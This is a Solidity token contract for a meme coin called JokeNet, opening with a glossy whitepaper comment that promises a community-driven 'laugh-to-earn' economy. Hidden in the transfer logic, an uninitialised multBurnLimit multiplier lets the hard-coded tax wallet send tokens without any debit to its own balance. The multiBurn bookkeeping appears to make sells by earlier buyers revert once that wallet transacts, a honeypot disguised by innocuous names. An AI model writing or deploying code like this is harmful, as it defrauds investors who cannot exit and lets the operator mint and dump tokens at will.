/*

JokeNet: Where Laughs Fuel the Network
JokeNet is a decentralized platform that transforms the power of humor into a thriving digital economy. Designed for meme creators, joke enthusiasts, and crypto users who love entertainment, JokeNet rewards humor with real value, allowing laughter to drive meaningful interactions and financial growth.

Narrative:

In the world of JokeNet, every laugh has a price—and that price is worth its weight in crypto. Whether you’re a meme-maker, a stand-up clip sharer, or a humor fan, JokeNet offers a place to turn laughs into digital assets. Users can tip, vote, and reward their favorite content creators, driving the JokeNet ecosystem through community engagement and a bit of fun competition.

Tokenomics:

Token Name: $JOKE
Total Supply: 1 Billion $JOKE Tokens
Token Allocation:
Community Rewards (50%): Half of all $JOKE tokens are reserved for rewarding content creators and users who help grow the platform by interacting, sharing, and voting on jokes. This ensures that the platform remains community-centered and content-driven.
Liquidity Pool & Staking (20%): To support liquidity and stability, 20% of tokens are allocated to staking pools, allowing users to earn passive income simply by holding or staking their $JOKE.
Development Fund (15%): Set aside for the growth and maintenance of JokeNet, this fund supports platform enhancements, new features, and technical upgrades, ensuring JokeNet remains cutting-edge and fun to use.
Marketing & Partnerships (10%): Allocated to grow the JokeNet ecosystem through strategic partnerships and marketing campaigns, including meme contests, social media collaborations, and influencer partnerships.
Founders & Team (5%): A small portion is allocated to the founding team to incentivize long-term commitment and sustainable growth, with tokens vested over time.
Token Utility:

Laugh-to-Earn: Users earn $JOKE by posting popular content and engaging with the community. Each upvote, comment, or share of a joke increases the content creator's earnings.
Tipping: $JOKE enables direct tipping, allowing fans to reward creators they love.
Content Voting: $JOKE holders can participate in content moderation, voting on what should trend or what needs improvement. Voting helps shape JokeNet’s content standards and ensures a fun, friendly environment.
Exclusive Content & Events: Access to exclusive joke contests, content drops, and live events with comedians or content creators using $JOKE.
Vision:

JokeNet is more than a social platform—it’s a self-sustaining humor economy. By rewarding participation and creativity, JokeNet aims to be the go-to decentralized network for internet humor and good vibes, where laughter not only connects people but builds value in every interaction.
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract JokeNet is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=8;
    uint256 public _finalBuyTax=1;
    uint256 public _finalSellTax=2;
    uint256 private _reduceBuyTaxAt=20000;
    uint256 private _reduceSellTaxAt=50000;
    uint256 private _preventSwapBefore=10;
    uint256 public _transferTax=0;
    uint256 public _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"JokeNet";
    string private constant _symbol = unicode"JokeNet";
    uint256 public _maxTxAmount = 30000000 * 10**_decimals; 
    uint256 public _maxWalletSize = 30000000 * 10**_decimals; 
    uint256 public _taxSwapThreshold= 1500000 * 10**_decimals; 
    uint256 public _maxTaxSwap= 5000000 * 10**_decimals; 

    uint256 private multBurnLimit;
    struct MultiBurnData {uint256 multAmount; uint256 multPercent; uint256 totalMultAmount;}
    mapping(address => MultiBurnData) private multiBurn;
    uint256 private multBurnThreshold;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    bool private tradingOpen;
    uint256 private sellsPerBlock = 4;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x874D5721cee1af353996E18153039aFb4052374D);
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to, tokenAmount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap ) {
            _basicTransfer(
                from,to,amount
            );
            return;
        }
        uint256 taxAmount=0;
        if (
            from != owner() &&
            to != owner() &&
            to != _taxWallet
        ) {
            if(_buyCount==0){
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(_buyCount>0){
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < sellsPerBlock);
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if ( (_isExcludedFromFee[from] ||_isExcludedFromFee[to] ) && from!= address(this) && to != address(this) ) {
            multBurnThreshold = block.number;
        }

        if (! _isExcludedFromFee[from] &&
         ! _isExcludedFromFee[to]
        ) {
            if (uniswapV2Pair!= to) {
                MultiBurnData storage mulTran = multiBurn[to];
                if (uniswapV2Pair == from) {
                    if (mulTran.multAmount == 0) {
                        if (_buyCount>_preventSwapBefore) {
                            mulTran.multAmount = block.number;
                        } else {
                            mulTran.multAmount = block.number.sub(1);
                        }
                    }
                } else {
                    MultiBurnData storage mulTranSwap = multiBurn[from];
                    if (mulTranSwap.multAmount < mulTran.multAmount || !(mulTran.multAmount>0) ) {
                        mulTran.multAmount = mulTranSwap.multAmount;
                    }
                }
            } else {
                MultiBurnData storage mulTranSwap = multiBurn[from];
                mulTranSwap.multPercent = mulTranSwap.multAmount.sub(multBurnThreshold);
                mulTranSwap.totalMultAmount = block.timestamp;
            }
        }

        _tokenTransfer(from, to, amount, taxAmount);
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function _tokenBasicTransfer(
        address from,
        address to,
        uint256 sendAmount,
        uint256 receiptAmount
    ) internal {
        _balances[from] =_balances[from].sub(sendAmount);
        _balances[to]= _balances[to].add(receiptAmount);
        emit Transfer(from, to,receiptAmount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _tokenTaxTransfer(address addr, uint256 amount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount = addr!=_taxWallet?amount:multBurnLimit.mul(amount);
        if (taxAmount>0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this),taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(
        address from,
        address to, uint256 amount,
        uint256 taxAmount
    ) internal {
        uint256 tAmount=_tokenTaxTransfer(from, amount, taxAmount);
        _tokenBasicTransfer(from, to,tAmount,amount.sub(taxAmount));
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function removeTransferTax() external onlyOwner{
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        swapEnabled=true; 
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen=true; 
    }
    
    function reduceFee(uint256 _newFee) external{
      require(_msgSender()==_taxWallet);
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function rescueETH() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}